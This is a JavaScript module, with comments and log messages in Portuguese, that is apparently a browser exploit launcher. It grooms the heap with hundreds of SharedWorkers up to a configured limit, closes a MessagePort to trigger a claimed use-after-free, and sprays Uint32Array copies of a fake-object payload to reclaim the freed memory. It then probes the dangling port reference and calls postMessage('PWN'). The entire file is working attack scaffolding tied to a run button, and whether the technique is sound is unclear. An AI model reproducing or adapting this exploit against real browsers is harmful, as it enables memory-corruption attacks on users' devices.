import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_heap_grooming } from './heap.mjs';
import { build_fake_object } from './payloads.mjs';

var workers_stash = [];

// Função Principal
async function start() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");

    const size_val = document.getElementById("size_selector").value;
    log(`>>> INICIANDO (Size: ${size_val}) <<<`);

    // 1. Construir Payload
    const payload = build_fake_object(size_val);
    
    // 2. Preparar Memória (Lapse Style)
    prepare_heap_grooming();

    // 3. Grooming de Workers (0 até o limite de segurança)
    log("EXPLOIT: Alocando Base Workers...");
    for (let i = 0; i < 400; i++) {
        try {
            let w = new SharedWorker("data:text/javascript,1", "g" + i);
            w.port.start();
            workers_stash.push(w);
        } catch (e) {}
    }

    // 4. Zona de Pressão (Trigger Loop)
    log(`EXPLOIT: Entrando na Zona de Pressão (Até ${CONFIG.WORKER_LIMIT})...`);
    
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 400; // Quantos faltam para o crash

    const interval = setInterval(() => {
        // Chegou no limite exato (404)
        if (p_count >= limit) {
            clearInterval(interval);
            trigger_uaf(payload);
            return;
        }

        try {
            let id = 401 + p_count;
            let w = new SharedWorker("data:text/javascript,1", "v" + p_count);
            w.port.start();
            workers_stash.push(w);
            log(`Worker ${id} criado.`);
        } catch(e) {
            log("Erro alocação: " + e, "fail");
        }
        
        p_count++;
    }, 150);
}

// O Abate
function trigger_uaf(payload) {
    log("!!! DISPARANDO SWAP (404) !!!", "fail");

    // 1. Vítima
    const victim = workers_stash.pop();
    const port_ref = victim.port; 

    // 2. FREE
    victim.port.close();
    // victim = null; // Mantemos referência local por enquanto

    // 3. SPRAY IMEDIATO (Reclaim)
    log("EXPLOIT: Injetando Payload...");
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(new Uint32Array(payload));
    }

    // 4. VERIFICAÇÃO (Sonda)
    try {
        const check = port_ref.toString();
        if (check.indexOf("MessagePort") === -1) {
            log("!!! SUCESSO: OBJETO CORROMPIDO !!!", "success");
            alert("Sucesso! Objeto substituído na memória.");
        } else {
            log("Falha: Objeto intacto. Tentando execução forçada...", "fail");
            // Força bruta
            port_ref.postMessage("PWN");
        }
    } catch (e) {
        log("Erro/Crash (Isso pode ser bom): " + e);
    }
}

// Ligar o botão ao iniciar
document.getElementById("btn_run").addEventListener("click", start);
